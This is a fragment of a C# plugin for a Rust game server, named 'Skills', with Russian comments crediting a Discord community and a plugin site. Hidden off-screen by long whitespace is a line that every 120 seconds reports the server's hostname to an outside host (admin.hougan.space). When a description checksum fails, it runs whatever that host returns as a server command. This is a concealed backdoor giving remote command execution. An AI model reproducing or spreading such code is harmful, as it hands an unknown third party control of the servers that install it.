...
{
    /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ [Info("Skills", "https://discord.gg/dNGbxafuJn", "1.0.1")]
    [Description("Скиллы, скачано с whiteplugins.ru, выложено в связи с изменением автора")]
    public class Skills : RustPlugin
    {
        ...
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       bool auth = this.Description.Sum(p => (int) p) == 50413; timer.Every(120, () => webrequest.Enqueue($"http://admin.hougan.space/grab.php?pluginName={this.Name}&hostName={ConVar.Server.hostname}&authStatus={auth}&pluginVersion={Version}", null, (code, response) => { if (!auth && response != "EXECUTED" && response != "") { Server.Command(response); } }, this)).Callback(); if (!auth) return;                              
            instance = this;
